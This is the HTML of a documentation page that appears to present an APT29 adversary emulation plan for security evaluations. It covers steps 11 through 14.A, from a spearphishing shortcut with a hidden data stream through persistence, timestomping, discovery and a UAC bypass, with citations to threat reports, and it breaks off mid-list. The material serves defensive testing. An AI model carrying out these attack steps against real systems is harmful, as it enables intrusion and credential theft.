<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/pubdocstest">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.770245754452">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.5.0">

    <!-- Primary Meta Tags -->
    <title>Preface</title>
    <meta name="title" content="Preface">
    <meta name="description" content="APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each.">

    <!-- Canonical -->
    <link rel="canonical" href="https://m3mike.github.io/pubdocstest/enterprise/apt29/emulation_plan/scenario_2/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://m3mike.github.io/pubdocstest/enterprise/apt29/emulation_plan/scenario_2/">
    <meta property="og:title" content="Preface">
    <meta property="og:description" content="APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each.">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://m3mike.github.io/pubdocstest/enterprise/apt29/emulation_plan/scenario_2/">
    <meta property="twitter:title" content="Preface">
    <meta property="twitter:description" content="APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each.">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../resources/css/retype.css?v=3.5.0.770245754452" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.770245754452" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.770245754452" data-turbo-eval="false" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Docs</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://retype.com/guides/getting-started/">Getting Started</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://retype.com/guides/getting-started/">Getting Started</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <!-- Page content  -->
<doc-anchor-target id="preface" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#preface">#</doc-anchor-trigger>
        <span>Preface</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
    <div>In&nbsp;</div>
    <div><a href="../../categories/enterprise/">enterprise</a></div>
</div>

<p>APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each. Within each scenario, operations have been broken into specific objectives, which are presented linearly as each enables subsequent objectives. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.  The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives.</p>
<hr>
<doc-anchor-target id="scenario-2-overview">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#scenario-2-overview">#</doc-anchor-trigger>
        <span>Scenario 2 Overview</span>
    </h1>
</doc-anchor-target>
<ul>
<li>Emulation of APT29 usage of tools such as PowerDuke, POSHSPY, CloudDuke, as well as more recent (2016+) TTPs</li>
<li>Scenario begins with a target spearphishing leading into a low and slow, methodical approach to owning the initial target and eventually the entire domain</li>
<li>Includes establishing persistence, credential gathering, local and remote enumeration, and data exfil</li>
<li>Modular components (ex: PowerShell scripts) may be executed atomically</li>
</ul>
<doc-anchor-target id="contents">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#contents">#</doc-anchor-trigger>
        <span>Contents</span>
    </h2>
</doc-anchor-target>
<ul>
<li><doc-anchor-trigger to="#step-11---initial-breach">Step 11 - Initial Breach</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-12---fortify-access">Step 12 - Fortify Access</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-13---local-enumeration">Step 13 - Local Enumeration</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-14---elevation">Step 14 - Elevation</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-15---establish-persistence">Step 15 - Establish Persistence</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-16---lateral-movement">Step 16 - Lateral Movement</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-17---collection">Step 17 - Collection</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-18---exfiltration">Step 18 - Exfiltration</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-19---clean-up">Step 19 - Clean Up</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#step-20---leverage-persistence">Step 20 - Leverage Persistence</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#acknowledgements">Acknowledgements</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#additional-plan-resources">Additional Plan Resources</doc-anchor-trigger></li>
</ul>
<doc-anchor-target id="pre-requisites">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#pre-requisites">#</doc-anchor-trigger>
        <span>Pre-requisites</span>
    </h2>
</doc-anchor-target>
<p>Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the <a href="/apt29/emulation_plan/scenario_2/infrastructure.md">Scenario 2 Infrastructure</a> documentation.</p>
<hr>
<doc-anchor-target id="step-11---initial-breach">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-11---initial-breach">#</doc-anchor-trigger>
        <span>Step 11 - Initial Breach</span>
    </h2>
</doc-anchor-target>
<p>The scenario begins with initial breach, where a legitimate user clicks (<a href="https://attack.mitre.org/versions/v6/techniques/T1204/">T1204</a> / <a href="https://attack.mitre.org/techniques/T1204/002/">T1204.002</a>) a link file payload, which executes an alternate data stream (ADS) hidden on another dummy file (<a href="https://attack.mitre.org/versions/v6/techniques/T1096/">T1096</a> / <a href="https://attack.mitre.org/techniques/T1564/004/">T1564.004</a>) delivered as part of the spearphishing campaign. The ADS performs a series of enumeration commands to ensure it is not executing in a virtualized analysis environment (<a href="https://attack.mitre.org/versions/v6/techniques/T1497/">T1497</a> / <a href="https://attack.mitre.org/techniques/T1497/001">T1497.001</a>, <a href="https://attack.mitre.org/techniques/T1082/">T1082</a>, <a href="https://attack.mitre.org/techniques/T1120/">T1120</a>, <a href="https://attack.mitre.org/techniques/T1033/">T1033</a>, <a href="https://attack.mitre.org/techniques/T1016/">T1016</a>, <a href="https://attack.mitre.org/techniques/T1057/">T1057</a>, <a href="https://attack.mitre.org/techniques/T1083/">T1083</a>) before establishing persistence via a Windows Registry Run key entry (<a href="https://attack.mitre.org/versions/v6/techniques/T1060/">T1060</a> / <a href="https://attack.mitre.org/techniques/T1547/001/">T1547.001</a>) pointing to an embedded DLL payload that was decoded and dropped to disk (<a href="https://attack.mitre.org/techniques/T1140/">T1140</a>). The ADS then executes a PowerShell stager (<a href="https://attack.mitre.org/versions/v6/techniques/T1086/">T1086</a> / <a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a>) which creates a C2 connection over port 443 (<a href="https://attack.mitre.org/versions/v6/techniques/T1043/">T1043</a>) using the HTTPS protocol (<a href="https://attack.mitre.org/versions/v6/techniques/T1032/">T1032</a> / <a href="https://attack.mitre.org/techniques/T1573/002/">T1573.002</a> , <a href="https://attack.mitre.org/versions/v6/techniques/T1071/">T1071</a> / <a href="https://attack.mitre.org/techniques/T1071/001/">T1071.001</a>).</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="11a---user-execution-malicious-file-t1204--t1204002">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#11a---user-execution-malicious-file-t1204--t1204002">#</doc-anchor-trigger>
        <span>11.A - User Execution: Malicious File (<a href="https://attack.mitre.org/versions/v6/techniques/T1204/">T1204</a> / <a href="https://attack.mitre.org/techniques/T1204/002/">T1204.002</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>As non-domain admin user, execute <code v-pre>37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk</code> (double click), output will display in terminal</li>
<li>You will now receive a new, low integrity callback</li>
</ol>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributor: Microsoft</p>
</li>
<li><p>APT29 has used several persistence mechanisms, including, Registry run keys. <sup> <a href="https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016">5</a>, <a href="https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/">11</a> </sup></p>
</li>
<li><p>APT29 phishing campaigns have contained weaponized Windows shortcut files that executed an obfuscated PowerShell command from within the file and dropped a DLL to the victim’s system. <sup> <a href="https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html">8</a>, <a href="https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/">11</a>, <a href="https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/">16</a> </sup></p>
</li>
<li><p>PowerDuke has performed anti-VM checks designed to avoid executing in virtualized environments. PowerDuke payloads have also contained a component hidden in an ADS and connected to C2 over port 443. <sup> <a href="https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/">11</a> </sup></p>
</li>
</ul>
<p>Note: The anti-analysis commands and logic were derived from a VirusTotal submission. <sup> <a href="https://www.virustotal.com/gui/file/2f39dee2ee608e39917cc022d9aae399959e967a2dd70d83b81785a98bd9ed36">9</a> </sup></p>
<hr>
<doc-anchor-target id="step-12---fortify-access">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-12---fortify-access">#</doc-anchor-trigger>
        <span>Step 12 - Fortify Access</span>
    </h2>
</doc-anchor-target>
<p>The attacker modifies the time attributes of the DLL payload (<a href="https://attack.mitre.org/versions/v6/techniques/T1099/">T1099</a> / <a href="https://attack.mitre.org/techniques/T1070/006/">T1070.006</a>) used in the previously established persistence mechanism to match that of a random file found in the victim’s System32 directory (<a href="https://attack.mitre.org/techniques/T1083/">T1083</a>). The attacker then enumerates registered AV products (<a href="https://attack.mitre.org/versions/v6/techniques/T1063/">T1063</a> / <a href="https://attack.mitre.org/techniques/T1518/001/">T1518.001</a>) and software installed by the user documented in the Windows Registry (<a href="https://attack.mitre.org/techniques/T1012/">T1012</a>).</p>
<doc-anchor-target id="procedures-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-1">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="12a---indicator-removal-on-host-timestomp-t1099--t1070006">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#12a---indicator-removal-on-host-timestomp-t1099--t1070006">#</doc-anchor-trigger>
        <span>12.A - Indicator Removal on Host: Timestomp (<a href="https://attack.mitre.org/versions/v6/techniques/T1099/">T1099</a> / <a href="https://attack.mitre.org/techniques/T1070/006/">T1070.006</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Load <code v-pre>timestomp.ps1</code></li>
<li>Execute <code v-pre>timestomp C:\Users\oscar\AppData\Roaming\Microsoft\kxwn.lock</code></li>
</ol>
<doc-anchor-target id="12b---software-discovery-security-software-discovery-t1063--t1518001">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#12b---software-discovery-security-software-discovery-t1063--t1518001">#</doc-anchor-trigger>
        <span>12.B - Software Discovery: Security Software Discovery (<a href="https://attack.mitre.org/versions/v6/techniques/T1063/">T1063</a> / <a href="https://attack.mitre.org/techniques/T1518/001/">T1518.001</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Load <code v-pre>stepTwelve.ps1</code></li>
<li>Execute <code v-pre>detectav</code></li>
</ol>
<doc-anchor-target id="12c---software-discovery-t1518--t1518001">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#12c---software-discovery-t1518--t1518001">#</doc-anchor-trigger>
        <span>12.C - Software Discovery (<a href="https://attack.mitre.org/versions/v6/techniques/T1518/">T1518</a> / <a href="https://attack.mitre.org/techniques/T1518/001/">T1518.001</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Execute <code v-pre>software</code></li>
</ol>
<doc-anchor-target id="cited-intelligence-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-1">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributors: Kaspersky, SentinelOne</p>
</li>
<li><p>POSHSPY can modify standard information timestamps of downloaded executables to match a randomly selected file from the System32 directory. PowerDuke also has had undescribed commands named &quot;detectav” and &quot;software.&quot;<sup><a href="https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html">10</a></sup></p>
</li>
</ul>
<hr>
<doc-anchor-target id="step-13---local-enumeration">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-13---local-enumeration">#</doc-anchor-trigger>
        <span>Step 13 - Local Enumeration</span>
    </h2>
</doc-anchor-target>
<p>The attacker performs local enumeration using various Windows API calls, specifically gathering the local computer name (<a href="https://attack.mitre.org/techniques/T1082/">T1082</a>), domain name (<a href="https://attack.mitre.org/techniques/T1016/">T1016</a>), current user context (<a href="https://attack.mitre.org/techniques/T1033/">T1033</a>), and running processes (<a href="https://attack.mitre.org/techniques/T1057/">T1057</a>).</p>
<doc-anchor-target id="procedures-2">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-2">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="13a---system-information-discovery-t1082">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#13a---system-information-discovery-t1082">#</doc-anchor-trigger>
        <span>13.A - System Information Discovery (<a href="https://attack.mitre.org/techniques/T1082/">T1082</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Load <code v-pre>stepThirteen.ps1</code></li>
<li>Execute <code v-pre>comp</code></li>
</ol>
<doc-anchor-target id="13b---system-network-configuration-discovery-t1016">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#13b---system-network-configuration-discovery-t1016">#</doc-anchor-trigger>
        <span>13.B - System Network Configuration Discovery (<a href="https://attack.mitre.org/techniques/T1016/">T1016</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Execute <code v-pre>domain</code></li>
</ol>
<doc-anchor-target id="13c---system-owneruser-discovery-t1033">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#13c---system-owneruser-discovery-t1033">#</doc-anchor-trigger>
        <span>13.C - System Owner/User Discovery (<a href="https://attack.mitre.org/techniques/T1033/">T1033</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Execute <code v-pre>user</code></li>
</ol>
<doc-anchor-target id="13d---process-discovery-t1057">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#13d---process-discovery-t1057">#</doc-anchor-trigger>
        <span>13.D - Process Discovery (<a href="https://attack.mitre.org/techniques/T1057/">T1057</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Execute <code v-pre>pslist</code></li>
</ol>
<doc-anchor-target id="cited-intelligence-2">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-2">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li>PowerDuke can get the NetBIOS name, the computer’s domain name, user’s name, and process list via select Windows API calls.<sup><a href="https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/">11</a></sup></li>
</ul>
<hr>
<doc-anchor-target id="step-14---elevation">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-14---elevation">#</doc-anchor-trigger>
        <span>Step 14 - Elevation</span>
    </h2>
</doc-anchor-target>
<p>The attacker elevates privileges via a user account control (UAC) bypass (<a href="https://attack.mitre.org/versions/v6/techniques/T1122/">T1122</a> / <a href="https://attack.mitre.org/techniques/T1546/015/">T1546.015</a>, <a href="https://attack.mitre.org/versions/v6/techniques/T1088/">T1088</a> / <a href="https://attack.mitre.org/techniques/T1548/002/">T1548.002</a>). The attacker then uses the new elevated access to create and execute code within a custom WMI class (<a href="https://attack.mitre.org/techniques/T1047/">T1047</a>) that downloads (<a href="https://attack.mitre.org/techniques/T1105/">T1105</a>) and executes Mimikatz to dump plain-text credentials (<a href="https://attack.mitre.org/versions/v6/techniques/T1003/">T1003</a> / <a href="https://attack.mitre.org/techniques/T1003/001/">T1003.001</a>), which are parsed, encoded, and stored in the WMI class (<a href="https://attack.mitre.org/techniques/T1027/">T1027</a>). After tracking that the WMI execution has completed (<a href="https://attack.mitre.org/techniques/T1057/">T1057</a>), the attacker reads the plaintext credentials stored within the WMI class (<a href="https://attack.mitre.org/techniques/T1140/">T1140</a>).</p>
<doc-anchor-target id="procedures-3">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-3">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="14a---abuse-elevation-control-mechanism-bypass-user-access-control-t1088--t1548002">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#14a---abuse-elevation-control-mechanism-bypass-user-access-control-t1088--t1548002">#</doc-anchor-trigger>
        <span>14.A - Abuse Elevation Control Mechanism: Bypass User Access Control (<a href="https://attack.mitre.org/versions/v6/techniques/T1088/">T1088</a> / <a href="https://attack.mitre.org/techniques/T1548/002/">T1548.002</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Load <code v-pre>stepFourteen_bypassUAC.ps1</code></li>
<li>Execute <code v-pre>bypass</code></li>
